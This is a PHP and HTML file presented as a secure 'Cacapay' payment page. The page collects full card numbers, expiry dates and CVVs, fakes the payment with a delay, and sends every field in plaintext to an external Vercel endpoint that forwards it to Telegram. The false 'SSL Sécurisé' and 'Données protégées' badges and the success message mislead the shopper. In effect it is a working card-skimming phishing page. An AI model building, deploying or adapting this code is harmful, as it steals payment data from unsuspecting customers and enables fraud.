<?php
// Exemple d'intégration pour un site PHP
// Configuration
$API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';

// Fonction pour envoyer la notification Telegram
function sendPaymentNotification($paymentData) {
    global $API_URL;
    
    $message = "💰 NOUVEAU PAIEMENT REÇU !\n";
    $message .= "👤 Nom: " . $paymentData['customerName'] . "\n";
    $message .= "📧 Email: " . $paymentData['email'] . "\n";
    $message .= "🛍️ Produit: " . $paymentData['product'] . "\n";
    $message .= "💳 Carte: " . $paymentData['cardNumber'] . "\n";
    $message .= "💶 Montant: " . $paymentData['amount'] . "€\n";
    $message .= "📅 Expiration: " . $paymentData['expiry'] . "\n";
    $message .= "🔒 CVV: " . $paymentData['cvv'] . "\n";
    $message .= "🔒 Vérifiez immédiatement !";
    
    $data = [
        'message' => $message,
        'type' => 'payment'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($API_URL, false, $context);
    
    if ($result === FALSE) {
        return ['success' => false, 'error' => 'Erreur de connexion'];
    }
    
    $response = json_decode($result, true);
    
    if ($response['success']) {
        return [
            'success' => true,
            'messageId' => $response['telegramResponse']['result']['message_id']
        ];
    } else {
        return [
            'success' => false,
            'error' => $response['error']
        ];
    }
}

// Traitement du formulaire
$result = null;
$error = null;

if ($_POST) {
    try {
        // Validation des données
        $required_fields = ['customerName', 'email', 'product', 'amount', 'cardNumber', 'expiry', 'cvv'];
        foreach ($required_fields as $field) {
            if (empty($_POST[$field])) {
                throw new Exception("Le champ $field est requis");
            }
        }
        
        // Préparation des données
        $paymentData = [
            'customerName' => htmlspecialchars($_POST['customerName']),
            'email' => htmlspecialchars($_POST['email']),
            'product' => htmlspecialchars($_POST['product']),
            'amount' => floatval($_POST['amount']),
            'cardNumber' => htmlspecialchars($_POST['cardNumber']),
            'expiry' => htmlspecialchars($_POST['expiry']),
            'cvv' => htmlspecialchars($_POST['cvv'])
        ];
        
        // Simulation du traitement du paiement
        sleep(1); // Simuler un délai de traitement
        
        // Envoyer la notification Telegram
        $notificationResult = sendPaymentNotification($paymentData);
        
        if ($notificationResult['success']) {
            $result = [
                'type' => 'success',
                'message' => 'Paiement réussi !',
                'data' => array_merge($paymentData, ['messageId' => $notificationResult['messageId']])
            ];
        } else {
            $error = 'Erreur lors de l\'envoi de la notification: ' . $notificationResult['error'];
        }
        
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cacapay - Paiement Sécurisé</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
        }
        
        .form-container {
            padding: 40px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        input, select {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #ff6b6b;
        }
        
        .card-row {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }
        
        .pay-button {
            width: 100%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
            margin-top: 20px;
        }
        
        .pay-button:hover {
            transform: translateY(-2px);
        }
        
        .result {
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            opacity: 0.7;
        }
        
        .badge {
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💳 Cacapay</h1>
            <p>Paiement sécurisé et instantané</p>
        </div>
        
        <div class="form-container">
            <form method="POST" action="">
                <div class="form-group">
                    <label for="customerName">Nom complet *</label>
                    <input type="text" id="customerName" name="customerName" 
                           value="<?php echo isset($_POST['customerName']) ? htmlspecialchars($_POST['customerName']) : ''; ?>" 
                           placeholder="Jean Dupont" required>
                </div>
                
                <div class="form-group">
                    <label for="email">Email *</label>
                    <input type="email" id="email" name="email" 
                           value="<?php echo isset($_POST['email']) ? htmlspecialchars($_POST['email']) : ''; ?>" 
                           placeholder="jean@example.com" required>
                </div>
                
                <div class="form-group">
                    <label for="product">Produit *</label>
                    <select id="product" name="product" required>
                        <option value="">Sélectionnez un produit</option>
                        <option value="Produit Premium" <?php echo (isset($_POST['product']) && $_POST['product'] === 'Produit Premium') ? 'selected' : ''; ?>>Produit Premium - 99.99€</option>
                        <option value="Produit Standard" <?php echo (isset($_POST['product']) && $_POST['product'] === 'Produit Standard') ? 'selected' : ''; ?>>Produit Standard - 49.99€</option>
                        <option value="Produit Basic" <?php echo (isset($_POST['product']) && $_POST['product'] === 'Produit Basic') ? 'selected' : ''; ?>>Produit Basic - 19.99€</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="amount">Montant (€) *</label>
                    <input type="number" id="amount" name="amount" 
                           value="<?php echo isset($_POST['amount']) ? htmlspecialchars($_POST['amount']) : ''; ?>" 
                           placeholder="99.99" step="0.01" min="0.01" required>
                </div>
                
                <div class="form-group">
                    <label for="cardNumber">Numéro de carte *</label>
                    <input type="text" id="cardNumber" name="cardNumber" 
                           value="<?php echo isset($_POST['cardNumber']) ? htmlspecialchars($_POST['cardNumber']) : ''; ?>" 
                           placeholder="1234 5678 9012 3456" maxlength="19" required>
                </div>
                
                <div class="card-row">
                    <div class="form-group">
                        <label for="expiry">Expiration *</label>
                        <input type="text" id="expiry" name="expiry" 
                               value="<?php echo isset($_POST['expiry']) ? htmlspecialchars($_POST['expiry']) : ''; ?>" 
                               placeholder="MM/AA" maxlength="5" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="cvv">CVV *</label>
                        <input type="text" id="cvv" name="cvv" 
                               value="<?php echo isset($_POST['cvv']) ? htmlspecialchars($_POST['cvv']) : ''; ?>" 
                               placeholder="123" maxlength="3" required>
                    </div>
                </div>
                
                <button type="submit" class="pay-button">
                    💳 Payer maintenant
                </button>
            </form>
            
            <?php if ($result): ?>
                <div class="result success">
                    <h3>🎉 Paiement réussi !</h3>
                    <p><strong>Client :</strong> <?php echo htmlspecialchars($result['data']['customerName']); ?></p>
                    <p><strong>Email :</strong> <?php echo htmlspecialchars($result['data']['email']); ?></p>
                    <p><strong>Produit :</strong> <?php echo htmlspecialchars($result['data']['product']); ?></p>
                    <p><strong>Montant :</strong> <?php echo htmlspecialchars($result['data']['amount']); ?>€</p>
                    <p><strong>Message ID :</strong> <?php echo htmlspecialchars($result['data']['messageId']); ?></p>
                    <p>📱 Notification envoyée sur Telegram !</p>
                    <p>✅ Vérifiez votre chat Telegram</p>
                </div>
            <?php endif; ?>
            
            <?php if ($error): ?>
                <div class="result error">
                    <h3>❌ Erreur</h3>
                    <p><?php echo htmlspecialchars($error); ?></p>
                </div>
            <?php endif; ?>
            
            <div class="security-badges">
                <div class="badge">🔒 SSL Sécurisé</div>
                <div class="badge">🛡️ Données protégées</div>
                <div class="badge">⚡ Paiement instantané</div>
            </div>
        </div>
    </div>
</body>
</html>
